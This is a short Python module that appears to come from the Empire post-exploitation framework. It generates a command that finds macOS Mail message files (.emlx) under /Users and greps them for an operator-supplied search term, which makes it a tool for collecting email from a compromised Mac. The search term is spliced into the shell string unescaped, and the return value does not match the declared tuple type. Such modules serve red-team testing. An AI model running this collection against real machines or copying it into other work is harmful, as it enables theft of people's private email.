from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> tuple[str | None, str | None]:
        searchTerm = params["SearchTerm"]

        script = 'cmd = "find /Users/ -name *.emlx 2>/dev/null'

        if searchTerm != "":
            script += "|xargs grep -i '" + searchTerm + "'\""
        else:
            script += '"'

        script += "\nrun_command(cmd)"

        return script
